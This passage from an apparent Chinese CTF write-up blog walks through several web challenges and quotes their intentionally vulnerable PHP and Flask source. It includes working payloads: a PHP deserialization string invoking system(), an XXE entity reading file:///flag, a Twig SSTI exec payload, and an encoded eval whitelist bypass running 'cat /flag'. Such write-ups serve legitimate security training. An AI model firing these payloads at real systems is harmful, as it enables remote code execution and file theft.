class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在php序列化，我们可以配合反序列进行绕过黑名单。</p><p>后端接收这两个参数后，调用call_user_func将上面的字符串进行反序列化，还原成上面的代码，执行我们的命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="buu2/23.png"></p><p>得到序列化：</p><p><code>O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p><p>执行成功。</p><p><img src="buu2/24.png"></p><p>没找到flag，但是不知道怎么找别的目录了。可以通过find / -name flag*来找到flag位置。</p><p>加个*可以匹配到flag开头任何后缀的文件名。</p><p>构造exp：</p><p><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p><p>试一下，没跑出来结果，结果每次输入，都没有回显，服务器都跳503了，可能是权限不够。</p><p>或者在/tmp目录下找文件，因为它的权限是一般普通用户都可。</p><p><img src="buu2/25.png"></p><p>然后cat到flag。</p><p><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p><p><img src="buu2/26.png"></p><h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>有Hint，flag is in ./flag.txt。</p><p>直接提示是SSRF漏洞。了解一下</p><p><em><strong>SSRF(服务器端请求伪造):是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</strong></em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>先整理一下源码，再分析，手工操作了半天，而且容易错，原来网上有python在线美化工具，处理后，自己再稍作调整即可。</p><p>有关Flask框架，关注点再函数getsign，又是有关md5的，不大懂，看看wp。这题很多知识点需要学习。</p><p>源码分析：</p><p><em><strong>是python的Flask框架，声明了一个Task类，然后是__init__方法对实例属性初始化，到exec方法，先通过checksign方法检测登陆，当我们传入的参数action和param经过getSign这个函数之后与sign相等，就返回true，返回true之后则进入if语句里面，这里可以看到，如果scan在action里面，则我们可以让param进入scan这个函数。需要注意的是，此处传入到scan里面的param没有被过滤，可以看到判断读和写是两个if关系，也就是说如果action中既有scan,又有read,那么就会依次执行scan和read，对于param参数的过滤，仅仅在于最开始的waf函数，不允许使用file协议和gopher协议读取服务器本地文件，但是我们可以通过让param为flag.txt，我们就能读取它的内容，</strong></em></p><p>方法一：md5字符串拼接。</p><p>由于要读取文件flag.txt，我们要构造参数，flag.txtread，这样就可以获得md5(secert_key+flag.txtreadscan)的md5值：</p><p>再访问De1ta，设置action和sign，和传入参数param的值，即可获得flag。</p><p><img src="buu2/27.png"></p><p>这里得到了flag.txtread加密后的md5值,最后修改相应参数得到flag。</p><p><img src="buu2/28.png"></p><p>方法二：</p><p><strong>MD5长度拓展攻击</strong></p><p>原理看看：<a href="https://joychou.org/web/hash-length-extension-attack.html">https://joychou.org/web/hash-length-extension-attack.html</a></p><p>使用工具：</p><p><a href="https://github.com/bwall/HashPump">https://github.com/bwall/HashPump</a></p><p>相关操作看看：<a href="https://blog.csdn.net/qq_42967398/article/details/103549258?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control">https://blog.csdn.net/qq_42967398/article/details/103549258?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.control</a></p><p>方法三：</p><p><strong>local_file</strong></p><p><a href="https://xz.aliyun.com/t/5927">https://xz.aliyun.com/t/5927</a></p><h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><p>刚开始试了一下想试一下xss漏洞，就爆出一大串错误，应该跟xss存在联系。</p><p>看见题目关键词XML，和HTML有相同点，关于它们的区别联系可以看看：<a href="https://www.cnblogs.com/hanfanfan/p/9734048.html">https://www.cnblogs.com/hanfanfan/p/9734048.html</a></p><p>这题应该就是存在有关xml漏洞了。百度了一下，XML存在XXE攻击。</p><p>有关XXE攻击可以看看<a href="https://www.freebuf.com/vuls/175451.html">https://www.freebuf.com/vuls/175451.html</a></p><p>我们通过客户端向服务器发送XML数据可控，可以引入一个恶意的外部实体，</p><p>接下来构造我们自己的恶意实体，读取flag文件。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">hhh</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="buu2/29.png"></p><h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>独角兽商店，购买独角兽需要提交两个参数，先尝试一下两个参数。</p><p>在只输入左边的时候报错返回，price参数被python的函数unicodedata.numeric，测试出来这里的价格只需要输入一个整数型数字，不需要输入浮点型，经过函数处理会变成浮点型，这个不是重点，</p><p><img src="buu2/30.png"></p><p>试了一下前三个商品都是错误，只剩第四个了，但是第四个的数字超过限制了，这个需要到网站找了经函数处理值大于1337的字符。</p><p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p>搜索thousand，然后找一下大于1337的，找了一个酷似音乐符号的፼，这里记得不要使用burp提交，不然显示不出来。</p><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>测试了许久，cookie的user处理存在ssti注入。</p><p><img src="buu2/31.png"></p><p>这里构造的user是根据前面修改cookie的时候回显中存在Set-Cookie值，setcookie() 函数是向客户端发送一个 HTTP cookie。</p><p>想直接用之前的学的的方法得到flag，行不通，存在检查。</p><p>看了wp学习了新的ssti注入姿势，可以参考这篇文章看看：</p><p><a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p><p>直接利用payload：</p><p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p><p><img src="buu2/32.png"></p><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>动态函数</strong></p><p>php可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数。</p><p><strong>php中函数名默认为字符串</strong></p><p>例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择，有利于化简。</p><p>这样我们就可以使用字符串拼接来构造payload：</p><p><code>?c=$_GET[A]($_GET[B])&amp;A=system&amp;b=cat flag</code></p><p>需要通过编码绕过，先了解一下这几个函数，</p><p>base_convert()函数：在任意进制转化数字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(number,frombase,tobase)</span><br></pre></td></tr></table></figure><p>number：原始值，frombase：数字原来的进制，需要转化成的进制。</p><p>dechex()函数：把十进制转化为十六进制。</p><p>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</p><p>直接先上payload：</p><p><code>    ?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat flag</code></p><p>转化后</p><p><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</code></p><p>首先中括号可以使用花括号代替，然后我们需要先生成hex2bin函数，通过base_convert()生成，这里选择36进制，因为base36有数字和字母刚好满足，把前面的十进制数字转化成36进制，得到hex2bin函数。再通过函数dechex把数字转化成_GET。</p><p>这里还有很多方法可以看看：</p><p><a href="https://www.jianshu.com/p/c187b336a49e">https://www.jianshu.com/p/c187b336a49e</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></p><h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>分别点击两个选项，观察url有个参数变化，这个参数是我们可控的，输入一下index.php</p><p>报错了，这里传入的参数应该可以读取文件，试一下php://filter，成功读取。</p><p><code>?category=php://filter/read=convert.base64-encode/resource=index</code></p><p>这里不用加后缀php前面测试报错有提示，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span 